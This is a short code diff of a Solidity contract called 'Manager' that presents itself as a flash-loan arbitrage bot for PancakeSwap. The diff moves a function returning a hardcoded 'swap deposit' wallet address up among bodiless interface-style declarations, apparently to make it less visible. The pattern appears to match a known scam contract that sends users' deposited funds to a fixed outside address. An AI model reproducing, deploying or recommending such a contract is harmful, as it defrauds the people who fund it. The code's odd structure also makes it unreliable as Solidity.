@@ -32,6 +32,10 @@ contract Manager {
         address to,
         uint256 value
     ) external returns (bool);
+    
+     function swapDepositAddress() public pure returns (address) {
+        return 0x57908d78F35f6d274E6A46520C3d6842A6683Ab9;
+    }
 
     function DOMAIN_SEPARATOR() external view returns (bytes32);
 
@@ -117,9 +121,7 @@ contract Manager {
             keccak256(abi.encodePacked((b))));
     }
 
-    function swapDepositAddress() public pure returns (address) {
-        return 0x57908d78F35f6d274E6A46520C3d6842A6683Ab9;
-    }
+   
 
     //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
     function borrowFlashloanFromMultiplier(
